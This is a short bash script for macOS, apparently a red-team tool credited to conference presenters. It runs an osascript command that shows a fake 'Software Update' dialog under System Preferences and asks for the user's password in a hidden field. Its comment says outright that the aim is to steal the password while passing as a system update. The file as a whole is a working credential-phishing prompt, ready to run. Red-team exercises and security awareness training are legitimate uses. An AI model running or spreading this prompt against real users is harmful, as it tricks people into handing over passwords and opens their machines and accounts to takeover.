#!/bin/bash
# 
# Popup Pwn
# Created by @FuzzyNop and showcased at DerbyCon 4, modified by @heinzarelli
# http://www.irongeek.com/i.php?page=videos/derbycon4/t201-red-teaming-back-and-forth-5ever-fuzzynop
#  
# OSX script to pop-up alert box on a host and attempt to steal the user's password. Looks like a system update.

osascript -e 'tell app "System Preferences" to display dialog "Software Update requires that you enter your password to apply changes." & return & return & "Password:" default answer "" with icon 1 with hidden answer'